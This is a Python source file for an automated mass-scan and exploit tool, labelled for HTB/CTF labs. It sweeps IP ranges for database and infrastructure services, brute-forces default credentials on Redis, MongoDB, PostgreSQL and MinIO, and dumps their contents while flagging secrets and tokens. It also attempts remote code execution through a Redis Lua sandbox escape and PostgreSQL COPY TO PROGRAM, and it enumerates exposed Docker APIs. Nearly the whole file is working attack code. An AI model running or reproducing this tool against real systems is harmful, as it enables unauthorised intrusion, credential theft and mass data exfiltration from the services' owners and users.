"""
Mass Pwn - Automated mass scan + exploit chain for HTB/CTF lab environments.
Usage:
    hot mass-pwn --targets targets.txt
    hot mass-pwn --cidr 10.10.10.0/24
    hot mass-pwn --ip 10.10.10.1,10.10.10.2
"""

import json
import socket
import concurrent.futures
from datetime import datetime
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Output directory
RESULTS_DIR = Path("mass_pwn_results")
RESULTS_DIR.mkdir(exist_ok=True)

# Service ports to scan
SERVICE_PORTS = {
    6379: "redis",
    27017: "mongodb",
    5432: "postgresql",
    3306: "mysql",
    8080: "http-alt",
    9000: "minio",
    9200: "elasticsearch",
    2375: "docker-api",
    11211: "memcached",
    15672: "rabbitmq",
    8888: "jupyter",
    5672: "amqp",
    6380: "redis-tls",
    6381: "redis-alt",
    1433: "mssql",
    21: "ftp",
    22: "ssh",
    80: "http",
    443: "https",
    8443: "https-alt",
    3000: "grafana",
    9090: "prometheus",
    2379: "etcd",
    8500: "consul",
    10250: "kubelet",
}

# High-value targets that we can auto-exploit
EXPLOITABLE_SERVICES = {
    "redis": {"ports": [6379, 6380, 6381], "attack_fn": "_attack_redis"},
    "mongodb": {"ports": [27017], "attack_fn": "_attack_mongodb"},
    "postgresql": {"ports": [5432], "attack_fn": "_attack_postgresql"},
    "minio": {"ports": [9000, 9001], "attack_fn": "_attack_minio"},
    "elasticsearch": {"ports": [9200], "attack_fn": "_attack_elasticsearch"},
    "docker-api": {"ports": [2375, 2376], "attack_fn": "_attack_docker"},
}


class MassPwn:
    def __init__(self, targets: list, threads: int = 20, timeout: int = 3):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.scan_results = {}
        self.compromised = []
        self.extracted_data = {}
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_dir = RESULTS_DIR / f"pwn_{self.timestamp}"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def _tcp_check(self, host: str, port: int) -> bool:
        """Quick TCP connect check."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def _scan_host(self, host: str) -> dict:
        """Scan a single host for all service ports."""
        open_ports = {}
        for port, service in SERVICE_PORTS.items():
            if self._tcp_check(host, port):
                open_ports[port] = service
        return {"host": host, "ports": open_ports}

    def phase1_scan(self):
        """Phase 1: Mass port scan to find live services."""
        console.print(Panel(
            f"[bold red]PHASE 1: MASS PORT SCAN[/bold red]\n"
            f"Targets: {len(self.targets)} | Ports: {len(SERVICE_PORTS)} | Threads: {self.threads}",
            border_style="red"
        ))

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("Scanning hosts...", total=len(self.targets))

            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(self._scan_host, host): host for host in self.targets}

                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    host = result["host"]
                    if result["ports"]:
                        self.scan_results[host] = result["ports"]
                    progress.update(task, advance=1)

        # Display results
        if self.scan_results:
            table = Table(title="Open Services Found", border_style="red")
            table.add_column("Host", style="green")
            table.add_column("Open Ports", style="cyan")
            table.add_column("Exploitable", style="red bold")

            for host, ports in self.scan_results.items():
                port_list = ", ".join(f"{p}/{s}" for p, s in sorted(ports.items()))
                exploitable = []
                for svc_name, svc_info in EXPLOITABLE_SERVICES.items():
                    for p in svc_info["ports"]:
                        if p in ports:
                            exploitable.append(svc_name)
                exploit_str = ", ".join(set(exploitable)) if exploitable else "-"
                table.add_row(host, port_list, exploit_str)

            console.print(table)
        else:
            console.print("[yellow]No open ports found on any target.[/yellow]")

        return self.scan_results

    def phase2_exploit(self):
        """Phase 2: Auto-exploit all discovered services."""
        console.print(Panel(
            "[bold red]PHASE 2: AUTO-EXPLOIT[/bold red]\n"
            "Attacking all exploitable services...",
            border_style="red"
        ))

        for host, ports in self.scan_results.items():
            for port, service in ports.items():
                for svc_name, svc_info in EXPLOITABLE_SERVICES.items():
                    if port in svc_info["ports"]:
                        console.print(f"\n[red]>>> Attacking {svc_name} on {host}:{port}[/red]")
                        attack_method = getattr(self, svc_info["attack_fn"], None)
                        if attack_method:
                            try:
                                result = attack_method(host, port)
                                if result and result.get("compromised"):
                                    self.compromised.append({
                                        "host": host,
                                        "port": port,
                                        "service": svc_name,
                                        "details": result,
                                    })
                                    if result.get("data"):
                                        self.extracted_data[f"{host}:{port}"] = result["data"]
                            except Exception as e:
                                console.print(f"  [dim]Attack failed: {e}[/dim]")

    def _attack_redis(self, host: str, port: int) -> dict:
        """Full Redis attack chain."""
        import redis as redis_lib

        result = {"compromised": False, "vulns": [], "data": None, "rce": False}

        # Step 1: Try no-auth connection
        try:
            r = redis_lib.Redis(host=host, port=port, socket_timeout=self.timeout, decode_responses=False)
            r.ping()
            result["compromised"] = True
            result["vulns"].append("no-auth")
            console.print("  [green][+] Redis NO AUTH - connected![/green]")
        except redis_lib.AuthenticationError:
            # Step 1b: Try default passwords
            passwords = ["", "redis", "password", "123456", "admin", "root", "foobared",
                         "test", "default", "changeme", "letmein", "qwerty"]
            for pwd in passwords:
                try:
                    r = redis_lib.Redis(host=host, port=port, password=pwd,
                                        socket_timeout=self.timeout, decode_responses=False)
                    r.ping()
                    result["compromised"] = True
                    result["vulns"].append(f"weak-password:{pwd}")
                    console.print(f"  [green][+] Redis password found: '{pwd}'[/green]")
                    break
                except Exception:
                    continue
            if not result["compromised"]:
                console.print("  [dim][-] Redis auth required, no weak password found[/dim]")
                return result
        except Exception as e:
            console.print(f"  [dim][-] Redis connection failed: {e}[/dim]")
            return result

        # Step 2: Get server info
        try:
            info = r.info()
            version = info.get("redis_version", "unknown")
            os_info = info.get("os", "unknown")
            console.print(f"  [cyan]    Version: {version} | OS: {os_info}[/cyan]")
            result["version"] = version
            result["os"] = os_info
        except Exception:
            pass

        # Step 3: Extract all data
        try:
            from hot_omelet.hot_redis.redis_client import RedisClient
            from hot_omelet.hot_redis.data_exporter import DataExporter

            pwd = None
            for v in result["vulns"]:
                if v.startswith("weak-password:"):
                    pwd = v.split(":", 1)[1]

            rc = RedisClient(host=host, port=port, password=pwd)
            if rc.connect():
                data = rc.extract_data()
                if data:
                    result["data"] = data
                    console.print(f"  [green][+] Extracted {len(data)} keys[/green]")

                    # Save data
                    outfile = self.output_dir / f"redis_{host}_{port}_data.json"
                    DataExporter.export_to_json(data, host, port)

                    # Look for juicy stuff
                    for key, value in data.items():
                        key_lower = str(key).lower()
                        if any(w in key_lower for w in ["flag", "secret", "password", "token", "key", "admin", "credential"]):
                            console.print(f"  [yellow][!] INTERESTING: {key} = {str(value)[:200]}[/yellow]")
        except Exception as e:
            console.print(f"  [dim]    Data extraction error: {e}[/dim]")

        # Step 4: Test Lua sandbox escape (RCE)
        try:
            from hot_omelet.hot_redis.sandbox_escaper import SandboxEscaper
            from hot_omelet.hot_redis.redis_client import RedisClient

            pwd = None
            for v in result["vulns"]:
                if v.startswith("weak-password:"):
                    pwd = v.split(":", 1)[1]

            rc2 = RedisClient(host=host, port=port, password=pwd)
            if rc2.connect():
                escaper = SandboxEscaper(rc2)
                rce_result = escaper.execute("id")
                if rce_result and b"uid=" in (rce_result if isinstance(rce_result, bytes) else rce_result.encode()):
                    result["rce"] = True
                    result["vulns"].append("lua-sandbox-escape-rce")
                    console.print(f"  [red][!!!] RCE via Lua sandbox escape! id={rce_result}[/red]")

                    # Get more info
                    for cmd in ["whoami", "hostname", "cat /etc/passwd | head -5", "ls -la /"]:
                        try:
                            out = escaper.execute(cmd)
                            if out:
                                console.print(f"  [red]    $ {cmd} => {str(out)[:200]}[/red]")
                        except Exception:
                            pass
        except Exception:
            pass

        # Step 5: Test CONFIG SET file write
        try:
            old_dir = r.config_get("dir").get("dir", "")
            old_dbf = r.config_get("dbfilename").get("dbfilename", "")
            r.config_set("dir", "/tmp")
            r.config_set("dbfilename", "pwn_test")
            r.config_set("dir", old_dir)
            r.config_set("dbfilename", old_dbf)
            result["vulns"].append("config-set-file-write")
            console.print("  [green][+] CONFIG SET file write possible (cron/SSH key injection)[/green]")
        except Exception as e:
            console.print(f"  [dim]    CONFIG SET blocked: {str(e)[:80]}[/dim]")

        # Step 6: Test MODULE LOAD
        try:
            r.execute_command("MODULE", "LIST")
            result["vulns"].append("module-load-available")
            console.print("  [green][+] MODULE LOAD available (malicious .so injection)[/green]")
        except Exception:
            pass

        return result

    def _attack_mongodb(self, host: str, port: int) -> dict:
        """Full MongoDB attack chain."""
        result = {"compromised": False, "vulns": [], "data": None}

        try:
            import pymongo
        except ImportError:
            console.print("  [dim]pymongo not installed[/dim]")
            return result

        # Step 1: Try no-auth connection
        client = None
        needs_auth = False
        try:
            client = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=self.timeout * 1000)
            info = client.server_info()
            version = info.get("version", "?")
            console.print(f"  [cyan]    MongoDB version: {version}[/cyan]")

            # Test if we can actually list databases (real no-auth test)
            dbs = client.list_database_names()
            result["compromised"] = True
            result["vulns"].append("no-auth")
            console.print("  [green][+] MongoDB NO AUTH - full access![/green]")
            console.print(f"  [cyan]    Databases: {', '.join(dbs)}[/cyan]")

        except pymongo.errors.OperationFailure:
            needs_auth = True
            console.print("  [dim]    Auth required for database operations[/dim]")
            if client:
                client.close()
                client = None
        except Exception as e:
            console.print(f"  [dim][-] MongoDB connection failed: {e}[/dim]")
            return result

        # Step 2: If auth required, try default creds
        if needs_auth:
            default_creds = [
                ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
                ("root", "root"), ("root", "password"), ("admin", ""),
                ("mongouser", "mongopass"), ("mongo", "mongo"),
                ("admin", "changeme"), ("admin", "mongo"),
            ]
            for user, pwd in default_creds:
                try:
                    client = pymongo.MongoClient(
                        host, port,
                        username=user, password=pwd,
                        authSource="admin",
                        serverSelectionTimeoutMS=self.timeout * 1000,
                    )
                    dbs = client.list_database_names()
                    result["compromised"] = True
                    result["vulns"].append(f"weak-creds:{user}:{pwd}")
                    console.print(f"  [green][+] MongoDB creds found: {user}:{pwd}[/green]")
                    console.print(f"  [cyan]    Databases: {', '.join(dbs)}[/cyan]")
                    break
                except Exception:
                    if client:
                        client.close()
                        client = None
                    continue

        if not result["compromised"] or not client:
            console.print("  [dim][-] MongoDB: no weak creds found[/dim]")
            return result

        # Step 3: Extract data from all databases
        try:
            extracted = {}
            for db_name in dbs:
                if db_name in ("admin", "config", "local"):
                    continue
                db = client[db_name]
                collections = db.list_collection_names()
                extracted[db_name] = {}
                for coll_name in collections:
                    try:
                        docs = list(db[coll_name].find().limit(50))
                        for doc in docs:
                            if "_id" in doc:
                                doc["_id"] = str(doc["_id"])
                        extracted[db_name][coll_name] = docs
                        console.print(f"  [green][+] {db_name}.{coll_name}: {len(docs)} docs[/green]")

                        for doc in docs:
                            doc_str = json.dumps(doc, default=str).lower()
                            if any(w in doc_str for w in ["password", "secret", "flag", "token", "credential", "api_key"]):
                                console.print(f"  [yellow][!] INTERESTING in {db_name}.{coll_name}: {json.dumps(doc, default=str)[:300]}[/yellow]")
                    except Exception:
                        continue

            result["data"] = extracted

            # Save
            if extracted:
                outfile = self.output_dir / f"mongodb_{host}_{port}_dump.json"
                with open(outfile, "w") as f:
                    json.dump(extracted, f, indent=2, default=str)
                console.print(f"  [green][+] Data saved to {outfile}[/green]")

        except Exception as e:
            console.print(f"  [dim]    Data extraction error: {e}[/dim]")

        if client:
            client.close()

        return result

    def _attack_postgresql(self, host: str, port: int) -> dict:
        """PostgreSQL attack chain."""
        result = {"compromised": False, "vulns": [], "data": None}

        default_creds = [
            ("postgres", "postgres"), ("postgres", "password"), ("postgres", ""),
            ("postgres", "123456"), ("admin", "admin"), ("root", "root"),
            ("postgres", "admin"), ("postgres", "root"), ("postgres", "letmein"),
        ]

        try:
            import psycopg2

            for user, pwd in default_creds:
                try:
                    conn = psycopg2.connect(
                        host=host, port=port, user=user, password=pwd,
                        dbname="postgres", connect_timeout=self.timeout,
                    )
                    result["compromised"] = True
                    result["vulns"].append(f"weak-creds:{user}:{pwd}")
                    console.print(f"  [green][+] PostgreSQL creds found: {user}:{pwd}[/green]")

                    cur = conn.cursor()

                    # List databases
                    cur.execute("SELECT datname FROM pg_database WHERE datistemplate = false;")
                    dbs = [row[0] for row in cur.fetchall()]
                    console.print(f"  [cyan]    Databases: {', '.join(dbs)}[/cyan]")

                    # Check superuser
                    cur.execute("SELECT current_user, session_user;")
                    users = cur.fetchone()
                    console.print(f"  [cyan]    User: {users[0]} | Session: {users[1]}[/cyan]")

                    cur.execute(f"SELECT usesuper FROM pg_user WHERE usename = '{users[0]}';")
                    is_super = cur.fetchone()
                    if is_super and is_super[0]:
                        result["vulns"].append("superuser")
                        console.print("  [red][!!!] SUPERUSER access![/red]")

                        # Try command execution
                        try:
                            cur.execute("COPY (SELECT '') TO PROGRAM 'id';")
                            result["vulns"].append("rce-copy-program")
                            console.print("  [red][!!!] RCE via COPY TO PROGRAM![/red]")
                        except Exception:
                            pass

                    # Extract tables from each database
                    extracted = {}
                    for db_name in dbs:
                        if db_name in ("template0", "template1"):
                            continue
                        try:
                            db_conn = psycopg2.connect(
                                host=host, port=port, user=user, password=pwd,
                                dbname=db_name, connect_timeout=self.timeout,
                            )
                            db_cur = db_conn.cursor()
                            db_cur.execute("""
                                SELECT table_schema, table_name FROM information_schema.tables
                                WHERE table_schema NOT IN ('pg_catalog', 'information_schema')
                                LIMIT 50;
                            """)
                            tables = db_cur.fetchall()

                            extracted[db_name] = {}
                            for schema, tbl in tables:
                                try:
                                    db_cur.execute(f'SELECT * FROM "{schema}"."{tbl}" LIMIT 20;')
                                    cols = [desc[0] for desc in db_cur.description]
                                    rows = [dict(zip(cols, row)) for row in db_cur.fetchall()]
                                    extracted[db_name][f"{schema}.{tbl}"] = rows
                                    console.print(f"  [green][+] {db_name}.{schema}.{tbl}: {len(rows)} rows[/green]")

                                    # Check for interesting data
                                    for row in rows:
                                        row_str = json.dumps(row, default=str).lower()
                                        if any(w in row_str for w in ["password", "secret", "flag", "token", "hash"]):
                                            console.print(f"  [yellow][!] INTERESTING: {json.dumps(row, default=str)[:300]}[/yellow]")
                                except Exception:
                                    continue

                            db_cur.close()
                            db_conn.close()
                        except Exception:
                            continue

                    result["data"] = extracted

                    # Save
                    outfile = self.output_dir / f"pgsql_{host}_{port}_dump.json"
                    with open(outfile, "w") as f:
                        json.dump(extracted, f, indent=2, default=str)
                    console.print(f"  [green][+] Data saved to {outfile}[/green]")

                    cur.close()
                    conn.close()
                    break

                except psycopg2.OperationalError:
                    continue

        except ImportError:
            console.print("  [dim]psycopg2 not installed[/dim]")
        except Exception as e:
            console.print(f"  [dim][-] PostgreSQL failed: {e}[/dim]")

        return result

    def _attack_minio(self, host: str, port: int) -> dict:
        """MinIO attack chain."""
        import requests

        result = {"compromised": False, "vulns": [], "data": None}

        default_creds = [
            ("minioadmin", "minioadmin"), ("admin", "admin"),
            ("minio", "minio123"), ("admin", "password"),
        ]

        for user, pwd in default_creds:
            try:
                # Try MinIO login
                resp = requests.post(
                    f"http://{host}:{port}/minio/login",
                    json={"accessKey": user, "secretKey": pwd},
                    timeout=self.timeout,
                )
                if resp.status_code == 200:
                    result["compromised"] = True
                    result["vulns"].append(f"default-creds:{user}:{pwd}")
                    console.print(f"  [green][+] MinIO creds found: {user}:{pwd}[/green]")
                    break
            except Exception:
                pass

            # Also try S3 API style
            try:
                from minio import Minio
                client = Minio(f"{host}:{port}", access_key=user, secret_key=pwd, secure=False)
                buckets = client.list_buckets()
                result["compromised"] = True
                result["vulns"].append(f"default-creds:{user}:{pwd}")
                console.print(f"  [green][+] MinIO S3 API creds: {user}:{pwd}[/green]")

                # List buckets and objects
                extracted = {}
                for bucket in buckets:
                    console.print(f"  [cyan]    Bucket: {bucket.name}[/cyan]")
                    objects = list(client.list_objects(bucket.name, recursive=True))
                    extracted[bucket.name] = [
                        {"name": obj.object_name, "size": obj.size}
                        for obj in objects[:100]
                    ]
                    for obj in objects[:5]:
                        console.print(f"      {obj.object_name} ({obj.size} bytes)")

                result["data"] = extracted
                break
            except ImportError:
                break
            except Exception:
                continue

        return result

    def _attack_elasticsearch(self, host: str, port: int) -> dict:
        """Elasticsearch attack chain."""
        import requests

        result = {"compromised": False, "vulns": [], "data": None}

        try:
            # Try without auth
            resp = requests.get(f"http://{host}:{port}/", timeout=self.timeout)
            if resp.status_code == 200:
                info = resp.json()
                result["compromised"] = True
                result["vulns"].append("no-auth")
                console.print("  [green][+] Elasticsearch NO AUTH![/green]")
                console.print(f"  [cyan]    Cluster: {info.get('cluster_name', '?')} | Version: {info.get('version', {}).get('number', '?')}[/cyan]")

                # List indices
                try:
                    idx_resp = requests.get(f"http://{host}:{port}/_cat/indices?format=json", timeout=self.timeout)
                    if idx_resp.status_code == 200:
                        indices = idx_resp.json()
                        extracted = {}
                        for idx in indices:
                            idx_name = idx.get("index", "")
                            if idx_name.startswith("."):
                                continue
                            console.print(f"  [cyan]    Index: {idx_name} ({idx.get('docs.count', '?')} docs)[/cyan]")

                            # Sample documents
                            try:
                                doc_resp = requests.get(
                                    f"http://{host}:{port}/{idx_name}/_search?size=20",
                                    timeout=self.timeout,
                                )
                                if doc_resp.status_code == 200:
                                    hits = doc_resp.json().get("hits", {}).get("hits", [])
                                    extracted[idx_name] = [h.get("_source", {}) for h in hits]
                                    console.print(f"  [green][+] {idx_name}: {len(hits)} docs extracted[/green]")

                                    for h in hits[:3]:
                                        doc_str = json.dumps(h.get("_source", {}), default=str)
                                        if any(w in doc_str.lower() for w in ["password", "secret", "flag", "token"]):
                                            console.print(f"  [yellow][!] INTERESTING: {doc_str[:300]}[/yellow]")
                            except Exception:
                                continue

                        result["data"] = extracted

                        # Save
                        outfile = self.output_dir / f"elastic_{host}_{port}_dump.json"
                        with open(outfile, "w") as f:
                            json.dump(extracted, f, indent=2, default=str)
                except Exception:
                    pass

        except Exception as e:
            console.print(f"  [dim][-] Elasticsearch failed: {e}[/dim]")

        return result

    def _attack_docker(self, host: str, port: int) -> dict:
        """Docker API attack chain."""
        import requests

        result = {"compromised": False, "vulns": [], "data": None}

        try:
            resp = requests.get(f"http://{host}:{port}/version", timeout=self.timeout)
            if resp.status_code == 200:
                info = resp.json()
                result["compromised"] = True
                result["vulns"].append("docker-api-exposed")
                console.print("  [red][!!!] Docker API EXPOSED - Full host takeover possible![/red]")
                console.print(f"  [cyan]    Docker: {info.get('Version', '?')} | OS: {info.get('Os', '?')}/{info.get('Arch', '?')}[/cyan]")

                # List containers
                try:
                    containers = requests.get(f"http://{host}:{port}/containers/json?all=true", timeout=self.timeout).json()
                    console.print(f"  [cyan]    Containers: {len(containers)}[/cyan]")
                    for c in containers:
                        console.print(f"      {c.get('Names', ['?'])[0]} | {c.get('Image', '?')} | {c.get('State', '?')}")
                except Exception:
                    pass

                # List images
                try:
                    images = requests.get(f"http://{host}:{port}/images/json", timeout=self.timeout).json()
                    console.print(f"  [cyan]    Images: {len(images)}[/cyan]")
                except Exception:
                    pass

                result["data"] = {"version": info, "containers": containers if 'containers' in dir() else []}

        except Exception as e:
            console.print(f"  [dim][-] Docker API failed: {e}[/dim]")

        return result

    def phase3_report(self):
        """Phase 3: Generate final report."""
        console.print(Panel(
            "[bold red]PHASE 3: ATTACK REPORT[/bold red]",
            border_style="red"
        ))

        # Summary table
        table = Table(title="Compromised Hosts", border_style="red")
        table.add_column("Host", style="green")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="yellow")
        table.add_column("Vulnerabilities", style="red")
        table.add_column("Data Extracted", style="magenta")

        for entry in self.compromised:
            vulns = ", ".join(entry["details"].get("vulns", []))
            has_data = "YES" if entry["details"].get("data") else "NO"
            table.add_row(
                entry["host"],
                str(entry["port"]),
                entry["service"],
                vulns,
                has_data,
            )

        console.print(table)

        # Save full report
        report = {
            "timestamp": self.timestamp,
            "targets_scanned": len(self.targets),
            "hosts_with_services": len(self.scan_results),
            "hosts_compromised": len(self.compromised),
            "scan_results": {h: {str(p): s for p, s in ports.items()} for h, ports in self.scan_results.items()},
            "compromised": self.compromised,
        }

        report_file = self.output_dir / "report.json"
        with open(report_file, "w") as f:
            json.dump(report, f, indent=2, default=str)

        console.print(f"\n[green]Results saved to: {self.output_dir}/[/green]")
        console.print(f"[green]Report: {report_file}[/green]")

        # Print stats
        console.print("\n[bold]STATS:[/bold]")
        console.print(f"  Targets scanned:     {len(self.targets)}")
        console.print(f"  Hosts with services: {len(self.scan_results)}")
        console.print(f"  Hosts compromised:   [red]{len(self.compromised)}[/red]")
        console.print(f"  Data extracted from: {len(self.extracted_data)} services")

        return report

    def run(self):
        """Run the full attack chain."""
        console.print(Panel(
            "[bold red]MASS PWN - Automated Attack Chain[/bold red]\n"
            f"Targets: {len(self.targets)} | Threads: {self.threads}\n"
            f"Output: {self.output_dir}",
            border_style="red",
            title="[red]RED OMELET[/red]",
        ))

        self.phase1_scan()

        if not self.scan_results:
            console.print("[yellow]No services found. Exiting.[/yellow]")
            return

        self.phase2_exploit()
        return self.phase3_report()


def parse_targets(targets_file=None, cidr=None, ip_list=None) -> list:
    """Parse targets from various input formats."""
    targets = []

    if targets_file:
        with open(targets_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)

    if cidr:
        import ipaddress
        try:
            network = ipaddress.ip_network(cidr, strict=False)
            targets.extend(str(ip) for ip in network.hosts())
        except ValueError as e:
            console.print(f"[red]Invalid CIDR: {e}[/red]")

    if ip_list:
        targets.extend(ip.strip() for ip in ip_list.split(",") if ip.strip())

    return list(set(targets))
